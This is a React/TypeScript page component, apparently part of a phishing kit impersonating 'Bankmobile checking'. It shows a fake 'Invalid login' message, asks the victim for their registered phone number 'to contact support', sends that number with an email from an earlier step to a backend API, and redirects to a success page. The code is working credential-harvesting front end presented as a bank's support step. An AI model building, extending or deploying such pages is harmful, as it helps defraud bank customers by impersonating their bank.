import { createLazyFileRoute, useNavigate } from "@tanstack/react-router";
import TwofactImg from "../../../assets/img/twofactauth.png";
import Foot from "../../../components/foot";
import {useRef, useState, useEffect, type FormEvent } from "react";


export const Route = createLazyFileRoute("/profile/phone/")({
  component: ProfileHome,
});

function ProfileHome() {
  const [prefix, setPrefix] = useState('');
  const [areaCode, setAreaCode] = useState('');
  const [line, setLine] = useState('');
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
  const api_url = import.meta.env.VITE_API_URL || 'http://127.0.0.1:5000';

  const navigate = useNavigate();
  // const search = useSearch({ from: '/profile/phone/' }) as { email?: string };
  const {email} = Route.useSearch()
  
  useEffect(()=>{
    document.title = "Welcome to Bankmobile checking"
  }, []);

  const handleDigitInput = (
    value: string,
    setter: (value: string) => void,
    nextIndex?: number,
  ) => {
    if (!/^\d*$/.test(value)) return;

    setter(value);

    if (value.length === 3 && nextIndex !== undefined) {
      inputRefs.current[nextIndex]?.focus();
    }
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const phoneNumber = `${prefix}${areaCode}${line}`;

    try {
      const res = await fetch (`${api_url}/api/profile/phone`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phoneNumber, email }),
      });

      const data = await res.json();

      if (res.ok) {
        navigate({ to: '/success', search: { email } });
      } else {
        console.error('Phone verification failed:', data);
      } 

    } catch (error) {
      // catch potential network errors or other issues
      console.error('Error occurred', error);
    }    
  };

  const goBack = () => {
    navigate({ to: '/' });
  }

  return (
    <>
      <div className="wrapper">
        <div className="flex flex-col items-center text-sm max-md:w-full max-md:p-3 max-w-350 mx-auto">
          <div className="w-full border-b-2 border-[#364153] mt-16"></div>

          <div className="w-2/5 max-w-xl rounded-xl border-4 border-[#364153] mt-16 flex flex-col text-center justify-center items-center gap-5 p-5 max-lg:w-full max-md:mx-3">
            <div className="flex flex-col gap-4 items-center pt-6">
              <div className="flex items-center justify-center">
                <img
                  src={TwofactImg}
                  alt="twofactauthimg"
                  className="w-20 h-auto"
                />
              </div>
              <h2 className="text-center text-sm font-semibold text-[#364153]">
                <span className="block">Invalid login</span>
                Enter your registered phone number to contact support
              </h2>
            </div>
            <form
              id="phoneForm"
              onSubmit={handleSubmit}
              className="flex items-center flex-col gap-5 w-full"
            >
              <div className="flex flex-col max-md:w-full">
                <div className="flex gap-3 px-9 mt-4 max-md:px-5 border  py-5 w-[70%]  max-md:max-w-100 max-md:w-full justify-center items-center mx-auto">
                  <div>
                    <input
                      ref={(el) => {
                        inputRefs.current[0] = el;
                      }}
                      id="prefix"
                      type="text"
                      inputMode="numeric"
                      maxLength={3}
                      value={prefix}
                      onChange={(e) =>
                        handleDigitInput(e.target.value, setPrefix, 1)
                      }
                      required
                      className="p-2 text-[#999] h-11 w-full bg-slate-100 border"
                    />
                  </div>
                  <span>-</span>
                  <div>
                    <input
                      ref={(el) => {
                        inputRefs.current[1] = el;
                      }}
                      id="area_code"
                      type="text"
                      inputMode="numeric"
                      maxLength={3}
                      value={areaCode}
                      onChange={(e) =>
                        handleDigitInput(e.target.value, setAreaCode, 2)
                      }
                      required
                      className="p-2 text-[#999] h-11 w-full bg-slate-100 border"
                    />
                  </div>
                  <span>-</span>
                  <div>
                    <input
                      ref={(el) => {
                        inputRefs.current[2] = el;
                      }}
                      id="line"
                      type="text"
                      inputMode="numeric"
                      maxLength={4}
                      value={line}
                      onChange={(e) =>
                        handleDigitInput(e.target.value, setLine)
                      }
                      required
                      className="p-2 text-[#999] h-11 w-full bg-slate-100 border"
                    />
                  </div>
                </div>
              </div>

              <div className="w-4/5 mt-3">
                <div className="flex gap-1 justify-center">
                  <button
                    type="button"
                    onClick={goBack}
                    className="bg-white px-7.5 py-3.75 text-[#364153] border-2 hover:border-[#79bde9] hover:bg-[#79bde9] hover:text-black cursor-pointer transition"
                  >
                    Try again
                  </button>
                  <button
                    type="submit"
                    className="bg-white px-7.5 py-3.75 text-[#364153] border-2 hover:border-[#79bde9] hover:bg-[#79bde9] hover:text-black cursor-pointer transition disabled:cursor-not-allowed disabled:bg-[#e2eff9] disabled:text-[#8fa6b7]"
                  >
                    Continue
                  </button>
                </div>
              </div>
            </form>
          </div>
          <div className="w-full border-b-2 border-gray-300 mt-16"></div>
          <Foot />
        </div>
      </div>
    </>
  );
}
